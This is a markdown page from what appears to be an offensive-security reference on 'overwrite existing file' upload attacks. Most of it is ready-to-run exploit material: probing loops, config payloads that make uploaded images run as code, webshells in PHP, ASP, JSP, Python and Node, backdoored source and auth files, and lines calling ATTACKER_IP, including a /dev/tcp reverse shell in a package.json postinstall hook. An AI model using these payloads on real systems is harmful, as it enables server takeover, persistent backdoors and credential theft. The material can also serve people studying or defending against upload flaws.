---
title: Overwrite Existing File Attack
description: Exploit file upload endpoints to overwrite critical server-side files including configuration files, application source code, authentication modules, templates, and system binaries to achieve remote code execution, privilege escalation, and persistent backdoor access.
navigation:
  icon: i-lucide-file-pen-line
  title: Overwrite Existing File
---

## Overview

::note
Overwrite Existing File attacks exploit upload mechanisms that fail to implement unique filename generation, lack proper write-path restrictions, or allow user-controlled destination paths. By uploading a file with the same name as an existing server-side file — or combining filename control with path traversal — attackers replace critical application files with malicious versions, achieving immediate code execution without needing to guess upload locations or trigger separate inclusion vulnerabilities.
::

::card-group
  ::card
  ---
  title: Configuration Overwrite
  icon: i-lucide-settings
  ---
  Replace server configuration files like `.htaccess`, `web.config`, `.user.ini`, `nginx.conf`, or application config files to modify server behavior, enable script execution, or inject backdoor directives.
  ::

  ::card
  ---
  title: Source Code Overwrite
  icon: i-lucide-file-code
  ---
  Replace application source files such as `index.php`, `app.py`, `routes.js`, or template files with webshell-injected versions to achieve immediate code execution on the next request.
  ::

  ::card
  ---
  title: Dependency & Library Overwrite
  icon: i-lucide-library
  ---
  Replace imported libraries, modules, middleware files, or autoloaded classes with trojanized versions that execute attacker payloads when the application loads them.
  ::

  ::card
  ---
  title: Credential & Auth Overwrite
  icon: i-lucide-lock
  ---
  Overwrite password files, authentication configurations, session storage, JWT secrets, or database connection files to bypass authentication or inject attacker-controlled credentials.
  ::
::

---

## Attack Surface Mapping

::tip
Before attempting overwrite attacks, map the application's file structure, identify writable directories, understand how uploaded filenames are processed, and determine which server-side files would yield immediate impact if replaced.
::

::tabs
  :::tabs-item{icon="i-lucide-search" label="File Structure Reconnaissance"}
  ```bash [Terminal]
  # Directory brute-force to find existing files
  gobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,txt,config,ini,json,xml,yml,yaml,env,bak -t 50

  # Recursive enumeration
  feroxbuster -u https://target.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,html,js,css,txt,json,xml -d 5 --silent

  # Specific config file probing
  for file in .htaccess .htpasswd web.config .user.ini .env .env.local .env.production php.ini .editorconfig composer.json package.json Gemfile requirements.txt Procfile Dockerfile docker-compose.yml Makefile Gruntfile.js gulpfile.js webpack.config.js tsconfig.json; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${file}")
    echo "${file}: HTTP ${STATUS}"
  done

  # Framework-specific file discovery
  # Laravel
  for file in .env artisan composer.json composer.lock config/app.php config/database.php routes/web.php storage/logs/laravel.log; do
    curl -s -o /dev/null -w "Laravel - ${file}: %{http_code}\n" "https://target.com/${file}"
  done

  # Django
  for file in manage.py settings.py urls.py wsgi.py requirements.txt db.sqlite3; do
    curl -s -o /dev/null -w "Django - ${file}: %{http_code}\n" "https://target.com/${file}"
  done

  # Express/Node.js
  for file in package.json package-lock.json server.js app.js index.js .env node_modules yarn.lock; do
    curl -s -o /dev/null -w "Node - ${file}: %{http_code}\n" "https://target.com/${file}"
  done

  # Spring Boot
  for file in application.properties application.yml pom.xml build.gradle; do
    curl -s -o /dev/null -w "Spring - ${file}: %{http_code}\n" "https://target.com/${file}"
  done

  # WordPress
  for file in wp-config.php wp-login.php xmlrpc.php wp-cron.php wp-settings.php wp-includes/version.php wp-content/debug.log; do
    curl -s -o /dev/null -w "WP - ${file}: %{http_code}\n" "https://target.com/${file}"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Upload Behavior Analysis"}
  ```bash [Terminal]
  # Test 1: Does the server preserve original filename?
  echo "MARKER_ORIGINAL_NAME" > testfile_unique_12345.txt
  curl -F "file=@testfile_unique_12345.txt" https://target.com/upload
  curl -s "https://target.com/uploads/testfile_unique_12345.txt"
  # If content matches → server preserves filename (overwrite possible)

  # Test 2: Does the server allow overwriting existing files?
  echo "VERSION_1" > overwrite_test.txt
  curl -F "file=@overwrite_test.txt" https://target.com/upload
  curl -s "https://target.com/uploads/overwrite_test.txt"

  echo "VERSION_2_OVERWRITTEN" > overwrite_test.txt
  curl -F "file=@overwrite_test.txt" https://target.com/upload
  CONTENT=$(curl -s "https://target.com/uploads/overwrite_test.txt")
  echo "Content after second upload: $CONTENT"
  # If VERSION_2 → overwrite confirmed

  # Test 3: Does renaming happen? (hash, timestamp, random prefix)
  for i in $(seq 1 5); do
    echo "TEST_$i" > probe.txt
    RESPONSE=$(curl -s -F "file=@probe.txt" https://target.com/upload)
    echo "Upload $i response: $RESPONSE"
  done
  # Compare returned filenames — if same → no renaming → overwrite possible

  # Test 4: Can filename be controlled via form field?
  curl -F "file=@shell.php" -F "filename=custom_name.php" https://target.com/upload
  curl -F "file=@shell.php" -F "name=custom_name.php" https://target.com/upload
  curl -F "file=@shell.php" -F "path=custom_name.php" https://target.com/upload
  curl -F "file=@shell.php" -F "dest=custom_name.php" https://target.com/upload
  curl -F "file=@shell.php" -F "target=custom_name.php" https://target.com/upload
  curl -F "file=@shell.php" -F "upload_path=/var/www/html/" https://target.com/upload
  curl -F "file=@shell.php" -F "dir=/" https://target.com/upload

  # Test 5: Does multipart filename parameter control saved name?
  curl -F "file=@localfile.txt;filename=controlled_name.txt" https://target.com/upload
  curl -s "https://target.com/uploads/controlled_name.txt"

  # Test 6: Can you use path separators in filename?
  curl -F "file=@test.txt;filename=../../test.txt" https://target.com/upload
  curl -F "file=@test.txt;filename=..\\..\\test.txt" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Identify Overwrite Targets"}
  ```bash [Terminal]
  # Identify high-value overwrite targets based on server technology

  # Apache targets
  APACHE_TARGETS=".htaccess .htpasswd httpd.conf apache2.conf sites-enabled/000-default.conf"

  # Nginx targets
  NGINX_TARGETS="nginx.conf sites-enabled/default conf.d/default.conf"

  # PHP targets
  PHP_TARGETS=".user.ini php.ini .htaccess index.php config.php db.php functions.php autoload.php"

  # IIS targets
  IIS_TARGETS="web.config applicationHost.config machine.config Global.asax"

  # Node.js targets
  NODE_TARGETS="server.js app.js index.js package.json .env ecosystem.config.js pm2.json"

  # Python targets
  PYTHON_TARGETS="app.py wsgi.py manage.py settings.py config.py requirements.txt"

  # Java targets
  JAVA_TARGETS="web.xml application.properties application.yml pom.xml"

  # Ruby targets
  RUBY_TARGETS="config.ru Gemfile config/routes.rb config/database.yml"

  # Check which exist and are accessible
  for target in $APACHE_TARGETS $PHP_TARGETS $NODE_TARGETS $PYTHON_TARGETS; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${target}" 2>/dev/null)
    if [ "$STATUS" != "404" ]; then
      echo "[FOUND] ${target}: HTTP ${STATUS}"
    fi
  done
  ```
  :::
::

---

## Server Configuration File Overwrite

::warning
Configuration file overwrite is the highest-impact overwrite attack. A single replaced config file can enable script execution in arbitrary directories, disable security controls, expose source code, or create new handler mappings that treat image files as executable code.
::

::accordion
  :::accordion-item{icon="i-lucide-file-cog" label=".htaccess Overwrite (Apache)"}
  ```bash [Terminal]
  # .htaccess controls per-directory Apache configuration
  # Overwriting it in the uploads directory allows PHP execution of any file

  # Payload 1: Enable PHP execution for all file types
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .php .jpg .png .gif .txt .html .pdf
  Options +ExecCGI
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload
  curl -F "file=@.htaccess" https://target.com/upload

  # Payload 2: Execute specific extensions as PHP
  cat > .htaccess << 'EOF'
  <FilesMatch "\.(jpg|png|gif)$">
    SetHandler application/x-httpd-php
  </FilesMatch>
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload

  # Now any uploaded .jpg with PHP code executes
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -F "file=@shell.jpg" https://target.com/upload
  curl "https://target.com/uploads/shell.jpg?cmd=id"

  # Payload 3: Disable security and enable everything
  cat > .htaccess << 'EOF'
  Options +Indexes +ExecCGI +FollowSymLinks +Includes
  AllowOverride All
  AddHandler cgi-script .cgi .pl .py .sh .rb
  AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .pht .phps .phar .inc .module
  AddHandler application/x-httpd-php .jpg .png .gif .bmp .svg .txt .html .css .js
  <IfModule mod_php.c>
    php_flag engine on
    php_flag display_errors on
    php_value auto_prepend_file /dev/null
  </IfModule>
  Require all granted
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload

  # Payload 4: PHP auto_prepend to backdoor all PHP files in directory
  cat > .htaccess << 'EOF'
  php_value auto_prepend_file shell.jpg
  EOF

  # Upload .htaccess
  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload

  # Upload shell as jpg
  echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>' > shell.jpg
  curl -F "file=@shell.jpg" https://target.com/upload

  # Any PHP file in the directory now auto-includes shell.jpg
  curl "https://target.com/uploads/any_existing_file.php?cmd=id"

  # Payload 5: Reverse proxy to attacker-controlled server
  cat > .htaccess << 'EOF'
  RewriteEngine On
  RewriteRule ^admin(.*)$ http://ATTACKER_IP:8080/admin$1 [P]
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload

  # Payload 6: Server-Side Includes (SSI) execution
  cat > .htaccess << 'EOF'
  Options +Includes
  AddType text/html .shtml .html .htm .jpg
  AddOutputFilter INCLUDES .shtml .html .htm .jpg
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload
  echo '<!--#exec cmd="id" -->' > ssi_shell.jpg
  curl -F "file=@ssi_shell.jpg" https://target.com/upload
  curl "https://target.com/uploads/ssi_shell.jpg"

  # Payload 7: ErrorDocument-based shell (no upload of second file needed)
  cat > .htaccess << 'EOF'
  ErrorDocument 404 "<?php system($_GET['cmd']); ?>"
  AddType application/x-httpd-php .html
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload
  curl "https://target.com/uploads/nonexistent.html?cmd=id"

  # Payload 8: Password protection removal for sensitive directories
  cat > .htaccess << 'EOF'
  # Remove all access controls
  Satisfy Any
  Allow from all
  Require all granted
  <IfModule mod_authz_core.c>
    Require all granted
  </IfModule>
  EOF

  curl -F "file=@.htaccess;filename=../../admin/.htaccess" https://target.com/upload

  # Payload 9: CGI execution (Python/Perl/Bash shells)
  cat > .htaccess << 'EOF'
  Options +ExecCGI
  AddHandler cgi-script .py .pl .sh .cgi .rb
  EOF

  curl -F "file=@.htaccess;filename=.htaccess" https://target.com/upload

  # Upload Python CGI shell
  cat > shell.py << 'PYEOF'
  #!/usr/bin/env python3
  import cgi, os
  print("Content-Type: text/html\n")
  params = cgi.FieldStorage()
  cmd = params.getvalue("cmd", "id")
  print("<pre>")
  os.system(cmd)
  print("</pre>")
  PYEOF
  chmod +x shell.py
  curl -F "file=@shell.py" https://target.com/upload
  curl "https://target.com/uploads/shell.py?cmd=id"
  ```
  :::

  :::accordion-item{icon="i-lucide-file-cog" label="web.config Overwrite (IIS)"}
  ```bash [Terminal]
  # web.config controls IIS behavior per directory
  # Overwriting it allows handler mapping changes, script execution, source disclosure

  # Payload 1: Execute .jpg as ASP
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="jpg_as_asp" path="*.jpg" verb="*" modules="IsapiModule"
          scriptProcessor="%windir%\system32\inetsrv\asp.dll"
          resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload

  # Upload ASP shell as JPG
  echo '<% Set o=CreateObject("WScript.Shell"):Set e=o.Exec("cmd /c "&Request("cmd")):Response.Write(e.StdOut.ReadAll()) %>' > shell.jpg
  curl -F "file=@shell.jpg" https://target.com/upload
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"

  # Payload 2: Execute .jpg as ASPX
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="jpg_as_aspx" path="*.jpg" verb="*"
          type="System.Web.UI.PageHandlerFactory"
          resourceType="Unspecified" requireAccess="Script" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload

  # Payload 3: Execute .jpg as PHP (IIS with PHP module)
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="jpg_as_php" path="*.jpg" verb="*"
          modules="FastCgiModule"
          scriptProcessor="C:\PHP\php-cgi.exe"
          resourceType="File" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload

  # Payload 4: Disable request filtering (allow dangerous extensions)
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <security>
        <requestFiltering>
          <fileExtensions allowUnlisted="true">
            <clear />
          </fileExtensions>
          <verbs allowUnlisted="true">
            <clear />
          </verbs>
          <hiddenSegments>
            <clear />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload

  # Payload 5: Custom error page with code execution
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <customErrors mode="Off" />
    </system.web>
    <system.webServer>
      <httpErrors errorMode="Detailed" />
    </system.webServer>
  </configuration>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload

  # Payload 6: web.config with inline ASP code
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
          scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"
          requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <!-- ASP code in comment won't break XML but executes when .config is handled as ASP -->
  <%
  Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll())
  %>
  EOF

  curl -F "file=@web.config;filename=web.config" https://target.com/upload
  curl "https://target.com/uploads/web.config?cmd=whoami"
  ```
  :::

  :::accordion-item{icon="i-lucide-file-cog" label=".user.ini Overwrite (PHP-FPM)"}
  ```bash [Terminal]
  # .user.ini is a per-directory PHP configuration file
  # Works with PHP-FPM, FastCGI, and PHP running as Apache module
  # Directives apply to all PHP files in the directory and subdirectories

  # Payload 1: Auto-prepend a shell file to all PHP execution
  cat > .user.ini << 'EOF'
  auto_prepend_file=shell.jpg
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload

  echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);die();} ?>' > shell.jpg
  curl -F "file=@shell.jpg" https://target.com/upload

  # Now every PHP file in the uploads dir includes shell.jpg first
  curl "https://target.com/uploads/index.php?cmd=id"

  # Payload 2: Auto-append (executes after main script)
  cat > .user.ini << 'EOF'
  auto_append_file=shell.jpg
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload

  # Payload 3: Enable remote file inclusion
  cat > .user.ini << 'EOF'
  allow_url_include=On
  allow_url_fopen=On
  auto_prepend_file=http://ATTACKER_IP/shell.php
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload

  # Payload 4: Log file poisoning via .user.ini
  cat > .user.ini << 'EOF'
  error_log=/tmp/php_errors.log
  display_errors=On
  log_errors=On
  auto_prepend_file=/tmp/php_errors.log
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload
  # Trigger error with PHP code in parameter
  curl "https://target.com/uploads/index.php?x=<?php+system(\$_GET['cmd']);+?>"
  # Error log now contains PHP code → auto_prepend includes it
  curl "https://target.com/uploads/index.php?cmd=id"

  # Payload 5: Session file inclusion
  cat > .user.ini << 'EOF'
  session.save_path=/tmp
  session.auto_start=1
  auto_prepend_file=/tmp/sess_ATTACKER_SESSION_ID
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload

  # Payload 6: Disable security functions
  cat > .user.ini << 'EOF'
  disable_functions=
  open_basedir=
  display_errors=On
  error_reporting=E_ALL
  auto_prepend_file=shell.jpg
  EOF

  curl -F "file=@.user.ini;filename=.user.ini" https://target.com/upload

  # Important: .user.ini has a TTL cache (default 300 seconds)
  # May need to wait up to 5 minutes for changes to take effect
  # Or overwrite with: user_ini.cache_ttl=0
  cat > .user.ini << 'EOF'
  auto_prepend_file=shell.jpg
  user_ini.cache_ttl=0
  EOF
  ```
  :::

  :::accordion-item{icon="i-lucide-file-cog" label="Nginx/Apache Config Overwrite"}
  ```bash [Terminal]
  # If path traversal allows reaching server config directories

  # Nginx — overwrite included config files
  # /etc/nginx/sites-enabled/default or /etc/nginx/conf.d/default.conf
  cat > nginx_evil.conf << 'EOF'
  server {
      listen 80;
      server_name _;
      root /var/www/html;

      location / {
          try_files $uri $uri/ =404;
      }

      # Enable PHP execution in uploads directory
      location ~ /uploads/.*\.jpg$ {
          fastcgi_pass unix:/var/run/php/php-fpm.sock;
          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
          include fastcgi_params;
      }

      # Expose sensitive files
      location ~ /\. {
          allow all;
      }
  }
  EOF

  curl -F "file=@nginx_evil.conf;filename=../../../../../../etc/nginx/sites-enabled/default" https://target.com/upload

  # Nginx — overwrite fastcgi_params to inject headers
  cat > fastcgi_params << 'EOF'
  fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  fastcgi_param PHP_VALUE "auto_prepend_file=/var/www/html/uploads/shell.jpg";
  fastcgi_param QUERY_STRING $query_string;
  fastcgi_param REQUEST_METHOD $request_method;
  EOF

  curl -F "file=@fastcgi_params;filename=../../../../../../etc/nginx/fastcgi_params" https://target.com/upload

  # Apache — overwrite ports.conf or apache2.conf
  cat > apache_evil.conf << 'EOF'
  ServerRoot "/etc/apache2"
  Listen 80
  <Directory /var/www/html/uploads>
      Options +ExecCGI
      AddHandler application/x-httpd-php .jpg .png .gif .txt
      Require all granted
  </Directory>
  EOF

  curl -F "file=@apache_evil.conf;filename=../../../../../../etc/apache2/sites-enabled/000-default.conf" https://target.com/upload

  # Force config reload (if you have command execution elsewhere)
  # nginx -s reload
  # apachectl graceful
  # systemctl reload nginx
  # systemctl reload apache2
  ```
  :::
::

---

## Application Source Code Overwrite

::caution
Overwriting application source files provides immediate code execution. Unlike configuration overwrites that modify behavior indirectly, source code overwrites place attacker-controlled code directly into the execution path.
::

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="PHP Application Overwrite"}
  ```bash [Terminal]
  # Overwrite index.php to inject backdoor
  # Original index.php is replaced with backdoored version

  # Payload 1: Prepend shell to existing functionality
  cat > index.php << 'EOF'
  <?php
  // Backdoor - hidden at top of file
  if(isset($_GET['cmd'])){
    header('X-Powered-By: PHP/7.4.3');  // Blend in
    system($_GET['cmd']);
    die();
  }
  if(isset($_COOKIE['backdoor'])){
    eval(base64_decode($_COOKIE['backdoor']));
    die();
  }
  // Original application continues below
  ?>
  <!DOCTYPE html>
  <html><body><h1>Welcome</h1></body></html>
  EOF

  curl -F "file=@index.php;filename=../index.php" https://target.com/upload
  curl -F "file=@index.php;filename=../../index.php" https://target.com/upload

  # Trigger backdoor
  curl "https://target.com/index.php?cmd=id"
  curl -b "backdoor=$(echo -n 'system("id");' | base64)" "https://target.com/index.php"

  # Payload 2: Overwrite WordPress wp-config.php
  cat > wp-config.php << 'EOF'
  <?php
  if(isset($_GET['cmd'])){system($_GET['cmd']);die();}

  define('DB_NAME', 'wordpress');
  define('DB_USER', 'root');
  define('DB_PASSWORD', '');
  define('DB_HOST', 'localhost');
  define('DB_CHARSET', 'utf8');
  define('DB_COLLATE', '');

  $table_prefix = 'wp_';
  define('WP_DEBUG', true);
  define('WP_DEBUG_LOG', true);

  if (!defined('ABSPATH'))
    define('ABSPATH', dirname(__FILE__) . '/');
  require_once(ABSPATH . 'wp-settings.php');
  EOF

  curl -F "file=@wp-config.php;filename=../wp-config.php" https://target.com/upload
  curl "https://target.com/wp-config.php?cmd=id"

  # Payload 3: Overwrite Laravel config/app.php
  # Download original first if accessible
  curl -s "https://target.com/config/app.php" > original_app.php 2>/dev/null

  cat > app.php << 'EOF'
  <?php
  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);die();}
  return [
      'name' => env('APP_NAME', 'Laravel'),
      'env' => env('APP_ENV', 'production'),
      'debug' => true,
      'url' => env('APP_URL', 'http://localhost'),
      'timezone' => 'UTC',
      'locale' => 'en',
      'key' => env('APP_KEY'),
      'cipher' => 'AES-256-CBC',
      'providers' => [],
      'aliases' => [],
  ];
  EOF

  curl -F "file=@app.php;filename=../../config/app.php" https://target.com/upload

  # Payload 4: Overwrite autoload files
  cat > autoload.php << 'EOF'
  <?php
  @eval($_POST['x']);
  require_once __DIR__ . '/composer/autoload_real.php';
  return ComposerAutoloaderInit::getLoader();
  EOF

  curl -F "file=@autoload.php;filename=../../vendor/autoload.php" https://target.com/upload

  # Payload 5: Overwrite functions.php (WordPress themes)
  cat > functions.php << 'EOF'
  <?php
  if(isset($_GET['cmd'])){system($_GET['cmd']);die();}
  // Keep theme functional
  add_theme_support('post-thumbnails');
  add_theme_support('title-tag');
  EOF

  curl -F "file=@functions.php;filename=../../wp-content/themes/twentytwentythree/functions.php" https://target.com/upload
  curl "https://target.com/?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Python Application Overwrite"}
  ```bash [Terminal]
  # Overwrite Flask/Django application files

  # Payload 1: Overwrite Flask app.py
  cat > app.py << 'PYEOF'
  from flask import Flask, request
  import subprocess, os

  app = Flask(__name__)

  @app.route('/cmd')
  def cmd():
      c = request.args.get('cmd', 'id')
      return '<pre>' + subprocess.getoutput(c) + '</pre>'

  @app.route('/')
  def index():
      return '<h1>Welcome</h1>'

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=5000, debug=True)
  PYEOF

  curl -F "file=@app.py;filename=../../app.py" https://target.com/upload
  curl "https://target.com/cmd?cmd=id"

  # Payload 2: Overwrite Django views.py
  cat > views.py << 'PYEOF'
  from django.http import HttpResponse
  import subprocess

  def index(request):
      if 'cmd' in request.GET:
          output = subprocess.getoutput(request.GET['cmd'])
          return HttpResponse(f'<pre>{output}</pre>')
      return HttpResponse('<h1>Welcome</h1>')
  PYEOF

  curl -F "file=@views.py;filename=../../app/views.py" https://target.com/upload

  # Payload 3: Overwrite Django settings.py
  cat > settings.py << 'PYEOF'
  import os, subprocess
  # Backdoor executes on import (when Django starts)
  if os.environ.get('BACKDOOR_CMD'):
      subprocess.Popen(os.environ['BACKDOOR_CMD'], shell=True)

  SECRET_KEY = 'attacker-controlled-secret-key-for-session-forgery'
  DEBUG = True
  ALLOWED_HOSTS = ['*']
  INSTALLED_APPS = ['django.contrib.admin', 'django.contrib.auth',
                    'django.contrib.contenttypes', 'django.contrib.sessions']
  DATABASES = {
      'default': {
          'ENGINE': 'django.db.backends.sqlite3',
          'NAME': 'db.sqlite3',
      }
  }
  PYEOF

  curl -F "file=@settings.py;filename=../../myproject/settings.py" https://target.com/upload

  # Payload 4: Overwrite wsgi.py (entry point for WSGI servers)
  cat > wsgi.py << 'PYEOF'
  import os
  os.system('curl http://ATTACKER_IP:8080/$(whoami)')

  from django.core.wsgi import get_wsgi_application
  os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')
  application = get_wsgi_application()
  PYEOF

  curl -F "file=@wsgi.py;filename=../../myproject/wsgi.py" https://target.com/upload

  # Payload 5: Overwrite requirements.txt for supply chain attack
  cat > requirements.txt << 'EOF'
  flask==2.3.0
  evil-package==1.0.0
  EOF

  curl -F "file=@requirements.txt;filename=../../requirements.txt" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Node.js Application Overwrite"}
  ```bash [Terminal]
  # Overwrite Express/Node.js application files

  # Payload 1: Overwrite server.js / app.js
  cat > app.js << 'EOF'
  const express = require('express');
  const { execSync } = require('child_process');
  const app = express();

  app.get('/cmd', (req, res) => {
    try {
      const output = execSync(req.query.cmd || 'id').toString();
      res.send(`<pre>${output}</pre>`);
    } catch(e) {
      res.send(`<pre>Error: ${e.message}</pre>`);
    }
  });

  app.get('/', (req, res) => res.send('<h1>Welcome</h1>'));
  app.listen(3000);
  EOF

  curl -F "file=@app.js;filename=../../app.js" https://target.com/upload
  curl -F "file=@app.js;filename=../../server.js" https://target.com/upload
  curl -F "file=@app.js;filename=../../index.js" https://target.com/upload

  # Payload 2: Overwrite package.json (change start script)
  cat > package.json << 'EOF'
  {
    "name": "app",
    "version": "1.0.0",
    "scripts": {
      "start": "node -e \"require('child_process').exec('curl http://ATTACKER_IP:8080/$(whoami)')\" && node app.js",
      "preinstall": "node -e \"require('child_process').exec('curl http://ATTACKER_IP:8080/pwned')\"",
      "postinstall": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')\"" 
    },
    "dependencies": {
      "express": "^4.18.0"
    }
  }
  EOF

  curl -F "file=@package.json;filename=../../package.json" https://target.com/upload

  # Payload 3: Overwrite middleware file
  cat > auth.js << 'EOF'
  // Backdoored authentication middleware
  module.exports = function(req, res, next) {
    if (req.headers['x-backdoor'] === 'letmein') {
      req.user = { id: 1, role: 'admin', username: 'admin' };
    }
    if (req.query.cmd) {
      const { execSync } = require('child_process');
      return res.send(execSync(req.query.cmd).toString());
    }
    next();
  };
  EOF

  curl -F "file=@auth.js;filename=../../middleware/auth.js" https://target.com/upload
  curl -H "X-Backdoor: letmein" "https://target.com/admin/dashboard"

  # Payload 4: Overwrite .env file
  cat > .env << 'EOF'
  NODE_ENV=development
  SECRET_KEY=attacker_controlled_secret_for_jwt_forgery
  DATABASE_URL=postgresql://attacker:password@ATTACKER_IP:5432/exfil
  ADMIN_PASSWORD=backdoor123
  DEBUG=true
  SESSION_SECRET=attacker_session_secret
  JWT_SECRET=forge_any_token_with_this
  EOF

  curl -F "file=@.env;filename=../../.env" https://target.com/upload

  # Payload 5: Overwrite EJS/Pug/Handlebars template
  cat > index.ejs << 'EOF'
  <% if (typeof require !== 'undefined') {
    const cmd = require('url').parse(require('http').IncomingMessage.prototype.url || '', true).query.cmd;
    if (cmd) { %>
      <pre><%= require('child_process').execSync(cmd).toString() %></pre>
  <% }} %>
  <h1>Welcome</h1>
  EOF

  curl -F "file=@index.ejs;filename=../../views/index.ejs" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Java Application Overwrite"}
  ```bash [Terminal]
  # Overwrite Java/Spring/Tomcat configuration and source files

  # Payload 1: Overwrite web.xml (Tomcat servlet config)
  cat > web.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="4.0">
    <!-- Allow JSP execution everywhere -->
    <servlet>
      <servlet-name>jsp</servlet-name>
      <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
      <init-param>
        <param-name>fork</param-name>
        <param-value>false</param-value>
      </init-param>
      <load-on-startup>3</load-on-startup>
    </servlet>
    <servlet-mapping>
      <servlet-name>jsp</servlet-name>
      <url-pattern>*.jpg</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
      <servlet-name>jsp</servlet-name>
      <url-pattern>*.png</url-pattern>
    </servlet-mapping>
  </web-app>
  EOF

  curl -F "file=@web.xml;filename=../../WEB-INF/web.xml" https://target.com/upload

  # Payload 2: Overwrite application.properties (Spring Boot)
  cat > application.properties << 'EOF'
  server.port=8080
  spring.main.allow-bean-definition-overriding=true
  management.endpoints.web.exposure.include=*
  management.endpoint.env.show-values=ALWAYS
  spring.h2.console.enabled=true
  spring.h2.console.settings.web-allow-others=true
  spring.datasource.url=jdbc:h2:mem:testdb
  spring.jpa.show-sql=true
  logging.level.root=DEBUG
  # Expose actuator endpoints
  management.security.enabled=false
  EOF

  curl -F "file=@application.properties;filename=../../src/main/resources/application.properties" https://target.com/upload
  # Access H2 console for RCE
  curl "https://target.com/h2-console/"

  # Payload 3: Overwrite logback.xml (Log4j/Logback config for JNDI)
  cat > logback.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <insertFromJNDI env-entry-name="ldap://ATTACKER_IP:1389/exploit" as="exploit"/>
    <appender name="FILE" class="ch.qos.logback.core.FileAppender">
      <file>/tmp/app.log</file>
    </appender>
    <root level="DEBUG">
      <appender-ref ref="FILE" />
    </root>
  </configuration>
  EOF

  curl -F "file=@logback.xml;filename=../../src/main/resources/logback.xml" https://target.com/upload

  # Payload 4: Upload JSP shell to webapps root
  cat > shell.jsp << 'EOF'
  <%@ page import="java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) out.println(line);
  }
  %>
  EOF

  curl -F "file=@shell.jsp;filename=../../shell.jsp" https://target.com/upload
  curl "https://target.com/shell.jsp?cmd=id"
  ```
  :::
::

---

